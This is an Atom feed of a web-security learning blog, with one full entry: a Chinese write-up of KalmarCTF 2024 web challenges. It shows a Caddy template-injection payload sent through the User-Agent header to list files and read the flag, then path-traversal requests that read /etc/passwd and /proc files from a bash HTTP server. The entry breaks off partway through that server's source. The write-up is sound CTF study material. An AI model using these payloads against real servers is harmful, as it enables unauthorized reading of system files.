<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WELLS Blog</title>
  
  <subtitle>Learning Web Security....</subtitle>
  <link href="https://we11s.github.io/atom.xml" rel="self"/>
  
  <link href="https://we11s.github.io/"/>
  <updated>2024-06-06T13:55:39.850Z</updated>
  <id>https://we11s.github.io/</id>
  
  <author>
    <name>Wells</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP文件包含</title>
    <link href="https://we11s.github.io/posts/6864a512/"/>
    <id>https://we11s.github.io/posts/6864a512/</id>
    <published>2024-05-28T16:01:57.000Z</published>
    <updated>2024-06-06T13:55:39.850Z</updated>
    
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-PHP" scheme="https://we11s.github.io/tags/Web-PHP/"/>
    
  </entry>
  
  <entry>
    <title>XXE-primer</title>
    <link href="https://we11s.github.io/posts/67440817/"/>
    <id>https://we11s.github.io/posts/67440817/</id>
    <published>2024-05-12T12:31:39.000Z</published>
    <updated>2024-05-21T13:26:44.309Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>SQLMap</title>
    <link href="https://we11s.github.io/posts/3150507853/"/>
    <id>https://we11s.github.io/posts/3150507853/</id>
    <published>2024-04-02T11:21:07.000Z</published>
    <updated>2024-04-09T10:16:02.210Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>2024KalmarCTF-WEB复盘</title>
    <link href="https://we11s.github.io/posts/1876369856/"/>
    <id>https://we11s.github.io/posts/1876369856/</id>
    <published>2024-03-19T05:16:51.000Z</published>
    <updated>2024-06-07T06:17:19.897Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>前言：</strong></p><p>靶场链接：<a href="https://kalmarc.tf/challenges">https://kalmarc.tf/challenges</a></p><p>难度太大了根本写不出来<br>参考大佬的题解最后复盘出来的</p><p>原文链接：<a href="https://ireland.re/posts/KalmarCTF_2024/">https://ireland.re/posts/KalmarCTF_2024/</a></p></blockquote><h1 id="复盘题解"><a href="#复盘题解" class="headerlink" title="复盘题解"></a>复盘题解</h1><h2 id="Ez-⛳-v2"><a href="#Ez-⛳-v2" class="headerlink" title="Ez ⛳ v2"></a>Ez ⛳ v2</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote><p>Caddy webserver is AWESOME, using a neat and compact syntax you can do a lot of powerful things, e.g. wanna know if your browser supports <em>HTTP3</em>? Or <em>TLS1.3</em>? etc</p><p><em>Caddy web服务器非常棒，使用简洁紧凑的语法可以做很多强大的事情，例如，想知道你的浏览器是否支持HTTP3？或者TLS1.3？等等。</em></p><p>Flag is located at <em>GET &#x2F;$(head -c 18 &#x2F;dev&#x2F;urandom | base64)</em> go fetch it.</p><p><em>Flag 位于GET &#x2F;$(head -c 18 &#x2F;dev&#x2F;urandom | base64)，去获取它吧。</em></p><p>附件：<a href="handout-caddy.zip">点击下载附件</a></p></blockquote><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>下载完打开附件包发现只有四个文件，<code>Caddyfile</code>、<code>docker-compose.yml</code>这两个中有比较有用的信息</p><p><code>docker-compose.yml</code>中的关键信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">caddy:</span><br><span class="line">  image: caddy:2.7.6-alpine</span><br><span class="line">  volumes:</span><br><span class="line">    - ./Caddyfile:/etc/caddy/Caddyfile:ro</span><br><span class="line">    - ./flag:/wpqdDNHnYu8MZeclmpCr9Q:ro  # FILE WILL BE RENAMED TO SOMETHING SIMILAR RANDOM ON PROD</span><br><span class="line">       # 文件将在生产环境中被重新命名为类似的随机名称</span><br></pre></td></tr></table></figure><p><code>Caddyfile</code>中为对Caddy的配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">(sec_headers) &#123;</span><br><span class="line">    root * /</span><br><span class="line">    header &#123;</span><br><span class="line">        Content-Security-Policy &quot;default-src &#x27;none&#x27;; frame-ancestors &#x27;none&#x27;; base-uri &#x27;none&#x27;;&quot;</span><br><span class="line">        Strict-Transport-Security &quot;max-age=31536000&quot;</span><br><span class="line">        X-XSS-Protection 0</span><br><span class="line">        X-Content-Type-Options nosniff</span><br><span class="line">        X-Frame-Options DENY</span><br><span class="line">        Referrer-Policy &quot;no-referrer&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(html_reply) &#123;</span><br><span class="line">    import sec_headers</span><br><span class="line">    header Content-Type text/html</span><br><span class="line">    templates</span><br><span class="line">    respond &quot;&lt;!DOCTYPE html&gt;&lt;meta charset=utf-8&gt;&lt;title&gt;&#123;http.request.host&#125;&lt;/title&gt;&lt;body&gt;&#123;args[0]&#125;&lt;/body&gt;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(json_reply) &#123;</span><br><span class="line">    templates &#123;</span><br><span class="line">        # By default placeholders are not replaced for json</span><br><span class="line">        mime application/json</span><br><span class="line">    &#125;</span><br><span class="line">    header Content-Type application/json</span><br><span class="line">    respond &quot;&#123;args[0]&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(http_reply) &#123;</span><br><span class="line">    tls internal &#123;</span><br><span class="line">        alpn &quot;&#123;args[0]&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    map &#123;args[0]&#125; &#123;proto_name&#125; &#123;</span><br><span class="line">        http/1.1 HTTP/1.1</span><br><span class="line">        h2 HTTP/2.0</span><br><span class="line">        h3 HTTP/3.0</span><br><span class="line">    &#125;</span><br><span class="line">    @correctALPN `&#123;http.request.proto&#125; == &#123;proto_name&#125;`</span><br><span class="line">    respond @correctALPN &quot;You are connected with &#123;http.request.proto&#125; (&#123;tls_version&#125;, &#123;tls_cipher&#125;).&quot;</span><br><span class="line">    import html_reply &quot;You are connected with &#123;http.request.proto&#125; instead of &#123;proto_name&#125; (&#123;tls_version&#125;, &#123;tls_cipher&#125;). &lt;!-- Debug: &#123;http.request.uuid&#125;--&gt;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(tls_reply) &#123;</span><br><span class="line">    tls internal &#123;</span><br><span class="line">        protocols &#123;args[0]&#125; &#123;args[1]&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    header Access-Control-Allow-Origin &quot;*&quot;</span><br><span class="line">    import json_reply &#123;&quot;tls_version&quot;:&quot;&#123;tls_version&#125;&quot;,&quot;alpn&quot;:&quot;&#123;http.request.tls.proto&#125;&quot;,&quot;sni&quot;:&quot;&#123;http.request.tls.server_name&#125;&quot;,&quot;cipher_suite&quot;:&quot;&#123;http.request.tls.cipher_suite&#125;&quot;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mtls.caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    tls internal &#123;</span><br><span class="line">        client_auth &#123;</span><br><span class="line">            mode require</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    templates</span><br><span class="line">    import html_reply `You are connected with client-cert &#123;http.request.tls.client.subject&#125;`</span><br><span class="line">&#125;</span><br><span class="line">tls.caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    import tls_reply tls1.2 tls1.3</span><br><span class="line">&#125;</span><br><span class="line">tls12.caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    import tls_reply tls1.2 tls1.2</span><br><span class="line">&#125;</span><br><span class="line">tls13.caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    import tls_reply tls1.3 tls1.3</span><br><span class="line">&#125;</span><br><span class="line">ua.caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    tls internal</span><br><span class="line">    templates</span><br><span class="line">    import html_reply `User-Agent: &#123;&#123;.Req.Header.Get &quot;User-Agent&quot;&#125;&#125;`</span><br><span class="line">&#125;</span><br><span class="line">http.caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    tls internal</span><br><span class="line">    templates</span><br><span class="line">    import html_reply &quot;You are connected with &#123;http.request.proto&#125; (&#123;tls_version&#125;, &#123;tls_cipher&#125;).&quot;</span><br><span class="line">&#125;</span><br><span class="line">http1.caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    import http_reply http/1.1</span><br><span class="line">&#125;</span><br><span class="line">http2.caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    import http_reply h2</span><br><span class="line">&#125;</span><br><span class="line">http3.caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    import http_reply h3</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">caddy.chal-kalmarc.tf &#123;</span><br><span class="line">    tls internal</span><br><span class="line">    import html_reply `Hello! Wanna know you if your browser supports &lt;a href=&quot;https://http1.caddy.chal-kalmarc.tf/&quot;&gt;http/1.1&lt;/a&gt;? &lt;a href=&quot;https://http2.caddy.chal-kalmarc.tf/&quot;&gt;http/2&lt;/a&gt;? Or fancy for some &lt;a href=&quot;https://http3.caddy.chal-kalmarc.tf/&quot;&gt;http/3&lt;/a&gt;?! Check your preference &lt;a href=&quot;https://http.caddy.chal-kalmarc.tf/&quot;&gt;here&lt;/a&gt;.&lt;br/&gt;We also allow you to check &lt;a href=&quot;https://tls12.caddy.chal-kalmarc.tf/&quot;&gt;TLS/1.2&lt;/a&gt;, &lt;a href=&quot;https://tls13.caddy.chal-kalmarc.tf/&quot;&gt;TLS/1.3&lt;/a&gt;, &lt;a href=&quot;https://tls.caddy.chal-kalmarc.tf/&quot;&gt;TLS preference&lt;/a&gt;, supports &lt;a href=&quot;https://mtls.caddy.chal-kalmarc.tf/&quot;&gt;mTLS&lt;/a&gt;? Checkout your &lt;a href=&quot;https://ua.caddy.chal-kalmarc.tf/&quot;&gt;User-Agent&lt;/a&gt;!&lt;!-- At some point we might even implement a &lt;a href=&quot;https://flag.caddy.chal-kalmarc.tf/&quot;&gt;flag&lt;/a&gt; endpoint! --&gt;`</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对于没用接触过的Caddy的我只能去官方文档看看其中的配置文件所代表的含义  <del>查了下发现还有中文文档哈哈哈哈哈哈哈哈哈哈</del></p><p>链接：<a href="https://caddy2.dengxiaolong.com/docs/">Caddy v2中文文档 (dengxiaolong.com)</a></p><p>不懂的就半查半猜，问问狗屁通，然后有个初步的理解:</p><p>Caddy中存在一个概念：<strong>片段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(指令名)&#123;</span><br><span class="line">具体的指令内容</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(html_reply) &#123;</span><br><span class="line">    import sec_headers</span><br><span class="line">    header Content-Type text/html</span><br><span class="line">    templates</span><br><span class="line">    respond &quot;&lt;!DOCTYPE html&gt;&lt;meta charset=utf-8&gt;&lt;title&gt;&#123;http.request.host&#125;&lt;/title&gt;&lt;body&gt;&#123;args[0]&#125;&lt;/body&gt;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>片段类似于我们熟悉的概念：<strong>函数</strong>，可以在被调用</p><p>在任何你需要的地方重复使用它：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import 指令名</span><br></pre></td></tr></table></figure><p><strong>块</strong></p><p><strong>块</strong>由一对花括号完成的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">... &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>花括号前写所服务的域名，花括号后填写对应的指令</p><p>此外在<strong>片段</strong>中有一个<strong>特别的指令</strong>：<code>templates</code>-模板，类似于python中的Jinja2模板引擎，进行实时渲染</p><p>对应的官方文档：<a href="https://caddyserver.com/docs/modules/http.handlers.templates">Module http.handlers.templates - Caddy Documentation (caddyserver.com)</a></p><p>根据<code>templates</code>对应的语法规则（<code>&#123;&#123;指令&#125;&#125;</code>）尝试能不能和Python一样进行模板注入</p><p>由于修改UA（<code>User-Agent</code>）比较方便，所以我选择了<code>ua.caddy.chal-kalmarc.tf</code>，将UA修改为<code>&#123;&#123;7*7&#125;&#125;</code>发现服务端返回了<code>500</code>错误，发现这个思路应该是有戏，修改为<code>&#123;&#123;.Host&#125;&#125;</code>发现最后页面返回了<code>User-Agent: ua.caddy.chal-kalmarc.tf</code>，发现确实可以进行类似模板注入的操作，而官方文档中有两个可以让我们读到<code>flag</code>的指令</p><p>1.<code>readFile</code></p><p><em>Reads and returns the contents of another file, as-is. Note that the contents are NOT escaped, so you should only read trusted files.</em><br><em>按原样读取并返回另一个文件的内容。请注意，内容不会被转义，因此您应该只读取受信任的文件。</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;readFile &quot;path/to/file.html&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>2.<code>listFiles</code></p><p><em>Returns a list of the files in the given directory, which is relative to the template context’s file root.</em><br><em>返回给定目录中的文件列表，该列表相对于模板上下文的文件根目录。</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;listFiles &quot;/mydir&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>因此我们修改UA为<code>&#123;&#123;listFiles "/"&#125;&#125;</code>获得flag的文件名： <code>CVGjuzCIVR99QNpJTLtBn9</code></p><p>然后再修改UA为<code>&#123;&#123;readFile "/CVGjuzCIVR99QNpJTLtBn9"&#125;&#125;</code>，最后成功获取flag：</p><p><code>kalmar&#123;Y0_d4wg_I_h3rd_y0u_l1k3_templates_s0_I_put_4n_template_1n_y0ur_template_s0_y0u_c4n_readFile_wh1le_y0u_executeTemplate&#125;</code></p><h2 id="BadAss-Server-for-Hypertext"><a href="#BadAss-Server-for-Hypertext" class="headerlink" title="BadAss Server for Hypertext"></a>BadAss Server for Hypertext</h2><p><em><strong>强悍的超文本服务器</strong></em></p><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote><p>I wrote my own HTTP server. I have to admit: the code is a bit cursed, but it works! So no problem, right?</p><p><em>我自己写了一个HTTP服务器。我必须承认：代码有点诡异，但是它能正常工作！所以没问题，对吗？</em></p></blockquote><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ul><li><code>/proc</code>目录以及子目录的功能及其作用</li><li>shell语言</li><li>通配符</li></ul><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>这是一个<strong>黑盒测试</strong>，点击题目链接后发现就一个按钮可以交互</p><p><img src="/./KalmarCTF-Web-Replay/image-20240324151813152.png" alt="image-20240324151813152"></p><p>点击这个按钮，跳转到<code>http://chal-kalmarc.tf:8080/assets/26c3f25922f71af3372ac65a75cd3b11/iceberg.jpg</code>，没用任何信息。查看初始页面的源码发现被隐藏了另一个按钮</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &lt;a href=&quot;assets/f200d055a267ae56160198e0fcb47e5f/try_harder.txt&quot;&gt;</span><br><span class="line">&lt;button&gt;Get the flag&lt;/button&gt;</span><br><span class="line">&lt;/a&gt; --&gt;</span><br></pre></td></tr></table></figure><p>再次点进去，发现就一句话：<code>Did you think it was this easy? Nah, this isn&#39;t the flag.</code></p><p>也没什么实际的价值点（<del>其实后面这两个东东会被利用到</del>），然后就是无头无脑的不断尝试了<code>robots.txt</code>、抓包再发包</p><p>这个过程中发现了一个比较有趣的，响应头中存在这样一个键值：<code>X-Powered-By: Bash</code>，shell语言做后端？？</p><p>发现随便输入一个内容到url后<strong>如果不存在</strong>会输出为：<code>cat: /app/static/1: No such file or directory</code>，可以大胆推测后端为shell语言了</p><p>然后我就开始怀疑是不是有<strong>目录创越的漏洞</strong>存在了，拦截请求包转到BP进行改包（浏览器的url中直接输入<code>..</code>会被删除，而并不会直接传会后端）将url修改为<code>/../../../../../etc/passwd</code>,返回包中出现了<code>passwd</code>中对应的内容</p><p><img src="/./KalmarCTF-Web-Replay/image-20240324153600061.png" alt="image-20240324153600061"></p><h4 id="逻辑漏洞1："><a href="#逻辑漏洞1：" class="headerlink" title="逻辑漏洞1："></a>逻辑漏洞1：</h4><p>发现<strong>目录穿越漏洞确实存在</strong>，可以尝试直接读一下<code>/flag</code>发现根目录下不存在<code>flag</code>文件，那就只能进<code>/proc</code>目录找找对应的进程和运行目录了，一般读取<code>1</code>进程（一般赛题docker中最初的线程号为1）和<code>self</code>进程（当前指令所属的进程），一通乱尝试<code>cmdline</code>、<code>environ</code>、<code>status</code>等等发现了一些有用的东西</p><p>在<code>/../../../../../proc/1/cmdline</code>尝试读取后端的运行程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: inode/x-empty</span><br><span class="line">X-Powered-By: Bash</span><br><span class="line">Content-Length: 0</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">socat TCP4-LISTEN:8080,reuseaddr,fork EXEC:/app/badass_server.sh</span><br></pre></td></tr></table></figure><p>此时我们可以找到我们的后端所属的脚本文件，我们再将它读取出来，尝试看看源码中是否存在漏洞。读取到的源码为：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># I hope there are no bugs in this source code...</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line"><span class="built_in">declare</span> -A request_headers</span><br><span class="line"><span class="built_in">declare</span> -A response_headers</span><br><span class="line"><span class="built_in">declare</span> method</span><br><span class="line"><span class="built_in">declare</span> uri</span><br><span class="line"><span class="built_in">declare</span> protocol</span><br><span class="line"><span class="built_in">declare</span> request_body</span><br><span class="line"><span class="built_in">declare</span> status=<span class="string">&quot;200 OK&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">abort</span></span>() &#123;</span><br><span class="line"><span class="built_in">declare</span> -gA response_headers</span><br><span class="line">status=<span class="string">&quot;400 Bad Request&quot;</span></span><br><span class="line">write_headers</span><br><span class="line"><span class="keyword">if</span> [ ! -z <span class="variable">$&#123;1+x&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">&gt;&amp;2 <span class="built_in">echo</span> <span class="string">&quot;Request aborted: <span class="variable">$1</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -en <span class="variable">$1</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">write_headers</span></span>() &#123;</span><br><span class="line">response_headers[<span class="string">&#x27;Connection&#x27;</span>]=<span class="string">&#x27;close&#x27;</span></span><br><span class="line">response_headers[<span class="string">&#x27;X-Powered-By&#x27;</span>]=<span class="string">&#x27;Bash&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">&quot;HTTP/1.0 <span class="variable">$status</span>\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;!response_headers[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">&quot;<span class="variable">$&#123;key&#125;</span>: <span class="variable">$&#123;response_headers[$key]&#125;</span>\r\n&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">&gt;&amp;2 <span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(date -u +&#x27;%Y-%m-%dT%H:%M:%SZ&#x27;)</span> <span class="variable">$SOCAT_PEERADDR</span> <span class="variable">$method</span> <span class="variable">$uri</span> <span class="variable">$protocol</span> -&gt; <span class="variable">$status</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">receive_request</span></span>() &#123;</span><br><span class="line"><span class="built_in">read</span> -d $<span class="string">&#x27;\n&#x27;</span> -a request_line</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$&#123;#request_line[@]&#125;</span> != 3 ]; <span class="keyword">then</span></span><br><span class="line">abort <span class="string">&quot;Invalid request line&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">method=<span class="variable">$&#123;request_line[0]&#125;</span></span><br><span class="line"></span><br><span class="line">uri=<span class="variable">$&#123;request_line[1]&#125;</span></span><br><span class="line"></span><br><span class="line">protocol=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$&#123;request_line[2]&#125;</span>&quot;</span> | sed <span class="string">&#x27;s/^\s*//g&#x27;</span> | sed <span class="string">&#x27;s/\s*$//g&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ ! <span class="variable">$method</span> =~ ^(GET|HEAD)$ ]]; <span class="keyword">then</span></span><br><span class="line">abort <span class="string">&quot;Invalid request method&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ ! <span class="variable">$uri</span> =~ ^/ ]]; <span class="keyword">then</span></span><br><span class="line">abort <span class="string">&#x27;Invalid URI&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$protocol</span> != <span class="string">&#x27;HTTP/1.0&#x27;</span> ] &amp;&amp; [ <span class="variable">$protocol</span> != <span class="string">&#x27;HTTP/1.1&#x27;</span> ]; <span class="keyword">then</span></span><br><span class="line">abort <span class="string">&#x27;Invalid protocol&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> -d $<span class="string">&#x27;\n&#x27;</span> header; <span class="keyword">do</span></span><br><span class="line">stripped_header=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$header</span>&quot;</span> | sed <span class="string">&#x27;s/^\s*//g&#x27;</span> | sed <span class="string">&#x27;s/\s*$//g&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$stripped_header</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">header_name=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$header</span>&quot;</span> | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 1 | sed <span class="string">&#x27;s/^\s*//g&#x27;</span> | sed <span class="string">&#x27;s/\s*$//g&#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27;[:upper:]&#x27;</span> <span class="string">&#x27;[:lower:]&#x27;</span>);</span><br><span class="line">header_value=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$header</span>&quot;</span> | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 2- | sed <span class="string">&#x27;s/^\s*//g&#x27;</span> | sed <span class="string">&#x27;s/\s*$//g&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$header_name</span>&quot;</span> ] || [[ <span class="string">&quot;<span class="variable">$header_name</span>&quot;</span> =~ [[:space:]] ]]; <span class="keyword">then</span></span><br><span class="line">abort <span class="string">&quot;Invalid header name&quot;</span>;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If header already exists, add value to comma separated list</span></span><br><span class="line"><span class="keyword">if</span> [[ -v request_headers[<span class="variable">$header_name</span>] 